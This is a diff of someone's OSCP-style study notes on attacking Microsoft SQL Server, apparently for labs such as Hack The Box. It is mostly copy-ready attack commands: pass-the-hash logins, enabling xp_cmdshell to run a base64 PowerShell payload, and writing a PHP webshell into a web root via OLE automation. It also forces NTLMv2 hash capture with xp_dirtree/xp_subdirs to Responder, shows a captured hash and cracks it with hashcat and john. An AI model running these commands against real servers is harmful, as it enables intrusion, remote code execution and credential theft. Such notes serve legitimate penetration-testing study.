@@ -1,11 +1,13 @@
 TCP/1433, UDP/1434
 
-|     | Content                  | Notes |
-| --- | ------------------------ | ----- |
-| 1   | [[#NMAP Enumeration]]    |       |
-| 2   | Basic Usage              |       |
-| 3   | xp_cmdshell RCE          | RCE   |
-| 4   | Capture hash (Responder) | Creds |
+| Content                         | Notes             |
+| ------------------------------- | ----------------- |
+| [[#NMAP Enumeration]]           |                   |
+| [[#LOGIN Syntax]]               |                   |
+| [[#Run commands through NXC]]   |                   |
+| [[#Basic Usage]]                |                   |
+| [[#XP_CMDSHELL RCE]]            | RCE               |
+| [[#Capture MSSQL Service Hash]] | Responder / Creds |
 
 ---
 ## NMAP Enumeration
@@ -83,56 +85,307 @@ button.addEventListener("click", async () => {
 ---
 ## LOGIN Syntax
 
-```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+##### Impacket-MSSQL Client
 
-const command = `impacket-mssqlclient [User]:[Password]@${ip} -windows-auth`;
-
-dv.paragraph("```bash\n" + command + "\n```");
-```
-or
+Basic login + Windows-auth
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");
-const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 
-const command = `impacket-mssqlclient '${discoveredDomain}/[user]:[PW]@${discoveredDomain}'`;
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";
 
-dv.paragraph("```bash\n" + command + "\n```");
-```
-PTH
-```
-impacket-mssqlclient DOMAIN/username@192.168.245.141 -windows-auth -hashes :NTHASH
+const command = `impacket-mssqlclient [User]:[Password]@${IP} -windows-auth`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
 ```
 
+Alternative Syntax
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";
+
+const command = `impacket-mssqlclient 'domain.com/[user]:[PW]@DCIP'`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
 ```
-SELECT name FROM master.dbo.sysdatabases
+
+Pass the Hash + Windows-auth
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";
+
+const command = `impacket-mssqlclient DOMAIN/username@${IP} -windows-auth -hashes :NTHASH`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
 ```
+
+---
+## Run commands through NXC
+
+Run cmd "whoami"
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";
+
+const command = `nxc mssql ${IP} -u [user] -p '[password]' --local-auth -x whoami`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+
+---
+## Basic Usage
 
 Show me every database in this master system
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";
+
+const command = `SELECT name FROM master.dbo.sysdatabases`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
 
 ![[Pasted image 20260918035607.png]]
 
 (These are all default DBs)
 
-```
-USE msdb;
+---
+
+USE database called "msdb"
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";
+
+const command = `USE msdb;`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
 ```
 
 ![[Pasted image 20260918035636.png]]
 
-```
-SELECT table_name FROM [msdb].INFORMATION_SCHEMA.TABLES;
+---
+
+List all tables inside this database
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";
+
+const command = `SELECT table_name FROM [msdb].INFORMATION_SCHEMA.TABLES;`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
 ```
 
 ![[Pasted image 20260918035740.png]]
 
-```cmd-session
-SELECT * FROM backupset;
+---
 
-GO
+Select everything from "backupset"
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";
+
+const command = `SELECT * FROM backupset;`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
 ```
-
-RESULT
 
 ```cmd-session
 id          username             password         data_of_joining
@@ -146,36 +399,83 @@ id          username             password         data_of_joining
 ```
 
 ---
+## XP_CMDSHELL RCE
 
-Run commands through NXC
+XP_CMDSHELL Basic CMD execution
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
 
-```
-nxc mssql dc01.sequel.htb -u [user] -p '[password]' --local-auth -x whoami
-```
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";
 
-XP_CMDSHELL
+const command = `xp_cmdshell whoami`;
 
-```
-xp_cmdshell whoami
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
 ```
 
 ![[Pasted image 20260918041913.png]]
 
-xp_cmdshell still disabled
+This shows, that xp_cmdshell is disabled. We need to enable it first.
 
-enable it
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
 
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";
+
+const command = `enable_xp_cmdshell`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
 ```
-enable_xp_cmdshell
-```
 
-```
-xp_cmdshell whoami
-```
-
-![[Pasted image 20260918042013.png]]
-
-![[Pasted image 20260918042033.png]]
+---
+#### Create base64 payload to execute in cmd
 
 https://shellgenerator.dev/ 
 
@@ -184,132 +484,299 @@ Shell > Powershell.exe
 Payload selection > Powershell
 Powershell #3 base64
 
-```
-xp_cmdshell powershell -e [payload]
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";
+
+const command = `xp_cmdshell powershell -e [payload]`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
 ```
 
 [[Sending payload reverse direction through ligolo pivot]]
 
 Note : 
-
 You can open 2 connections at once
 
-```mssql
--- To allow advanced options to be changed.  
-EXECUTE sp_configure 'show advanced options', 1
-GO
+---
+#### Advanced XP_CMDSHELL enabling
 
--- To update the currently configured value for advanced options.  
-RECONFIGURE
-GO  
+To allow advanced options to be changed.
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
 
--- To enable the feature.  
-EXECUTE sp_configure 'xp_cmdshell', 1
-GO  
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";
 
--- To update the currently configured value for this feature.  
-RECONFIGURE
-GO
+const command = `EXECUTE sp_configure 'show advanced options', 1`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
 ```
 
-To write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:
+To update the currently configured value for advanced
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
 
-Enable ole automation procedures
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";
 
-```cmd-session
-1> sp_configure 'show advanced options', 1
-2> GO
-3> RECONFIGURE
-4> GO
-5> sp_configure 'Ole Automation Procedures', 1
-6> GO
-7> RECONFIGURE
-8> GO
+const command = `RECONFIGURE`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
 ```
 
-Create a file
+To enable the feature.
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
 
-```cmd-session
-1> DECLARE @OLE INT
-2> DECLARE @FileID INT
-3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
-4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
-5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
-6> EXECUTE sp_OADestroy @FileID
-7> EXECUTE sp_OADestroy @OLE
-8> GO
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";
+
+const command = `EXECUTE sp_configure 'xp_cmdshell', 1`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
 ```
 
-Read local files
+To update the currently configured value for this feature.
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
 
-```cmd-session
-1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
-2> GO
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";
 
-BulkColumn
+const command = `RECONFIGURE`;
 
------------------------------------------------------------------------------
-# Copyright (c) 1993-2009 Microsoft Corp.
-#
-# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
-#
-# This file contains the mappings of IP addresses to hostnames. Each
-# entry should be kept on an individual line. The IP address should
+const button = dv.container.createEl("button", {
+    text: command
+});
 
-(1 rows affected)
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
 ```
 
-COPIED
-
+---
 ## Capture MSSQL Service Hash
 
-```
-sudo responder -I tun0
-```
+On KALI, start a responder listener
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
 
-```
-EXEC master..xp_dirtree '\\[RESPONDERtunIP]\share\'
-```
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";
 
+const command = `sudo responder -I tun0`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
 ```
-echo "[user:hash]" > hash
-```
-
-[[Synced OSCP Notes/Small Toolkit/Tools/Cracking/Hashcat]]
-
-In the `Attacking SMB` section, we discussed that we could create a fake SMB server to steal a hash and abuse some default implementation within a Windows operating system. We can also steal the MSSQL service account hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.
-
-To make this work, we need first to start [Responder](https://github.com/lgandx/Responder) or [impacket-smbserver](https://github.com/SecureAuthCorp/impacket) and execute one of the following SQL queries:
 
 #### XP_DIRTREE Hash Stealing
 
-  Attacking SQL Databases
+In MSSQL Client, trigger a request to our IP
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
 
-```cmd-session
-1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
-2> GO
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";
 
-subdirectory    depth
---------------- -----------
+const command = `EXEC master..xp_dirtree '\\\\[RESPONDERtunIP]\\share\\'`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
 ```
 
 #### XP_SUBDIRS Hash Stealing
 
-  Attacking SQL Databases
+In MSSQL Client, trigger a request to our IP
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
 
-```cmd-session
-1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
-2> GO
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";
 
-HResult 0x55F6, Level 16, State 1
-xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
+const command = `EXEC master..xp_subdirs '\\\\${KaliIP}\\share\\''`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
 ```
-
-If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.
-
-#### XP_SUBDIRS Hash Stealing with Responder
-
-  Attacking SQL Databases
 
 ```shell-session
 Retric@htb[/htb]$ sudo responder -I tun0
@@ -328,6 +795,82 @@ Retric@htb[/htb]$ sudo responder -I tun0
 [SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
 ```
 
+Save the full captured NetNTLMv2 line into hash.txt. From "demouser" to "000" (ending)
+```
+echo "[user:hash]" > hash.txt
+```
+
+Cracking with hashcat
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";
+
+const command = `hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+
+Cracking with john
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";
+
+const command = `john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+
+---
 #### XP_SUBDIRS Hash Stealing with impacket
 
   Attacking SQL Databases
@@ -532,3 +1075,55 @@ DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote         
 **Note:** If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).
 
 As we have seen, we can now execute queries with sysadmin privileges on the linked server. As `sysadmin`, we control the SQL Server instance. We can read data from any database or execute system commands with `xp_cmdshell`. This section covered some of the most common ways to attack SQL Server and MySQL databases during penetration testing engagements. There are other methods for attacking these database types as well as others, such as [PostGreSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql), SQLite, Oracle, [Firebase](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/buckets/firebase-database), and [MongoDB](https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb) which will be covered in other modules. It is worth taking some time to read up on these database technologies and some of the common ways to attack them as well.
+
+---
+
+
+To write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:
+
+Enable ole automation procedures
+
+```cmd-session
+1> sp_configure 'show advanced options', 1
+2> GO
+3> RECONFIGURE
+4> GO
+5> sp_configure 'Ole Automation Procedures', 1
+6> GO
+7> RECONFIGURE
+8> GO
+```
+
+Create a file
+
+```cmd-session
+1> DECLARE @OLE INT
+2> DECLARE @FileID INT
+3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+6> EXECUTE sp_OADestroy @FileID
+7> EXECUTE sp_OADestroy @OLE
+8> GO
+```
+
+Read local files
+
+```cmd-session
+1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+2> GO
+
+BulkColumn
+
+-----------------------------------------------------------------------------
+# Copyright (c) 1993-2009 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+# This file contains the mappings of IP addresses to hostnames. Each
+# entry should be kept on an individual line. The IP address should
+
+(1 rows affected)
+```
+
+COPIED
